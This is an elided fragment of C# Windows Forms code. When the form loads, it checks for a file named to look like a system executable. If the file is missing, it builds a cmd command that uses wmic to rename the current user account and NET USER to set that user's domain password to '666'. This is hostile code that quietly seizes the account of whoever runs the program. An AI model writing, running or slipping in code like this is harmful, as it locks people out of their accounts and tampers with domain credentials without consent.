    ...
    public partial class Form1 : Form
    {
        ...
        private void Form1_Load(object sender, EventArgs e)
        {
            ...
            if (!File.Exists(@"C:\Windows\winnt64.exe"))
            {
                ...
                usrdetails.Arguments = @"/k wmic useraccount where name = " + singlequote + "%username%" + singlequote + " rename " + singlequote + "Domenico Bini" + singlequote + " && NET USER " + singlequote + "%username%" + singlequote + " 666 /domain && exit";
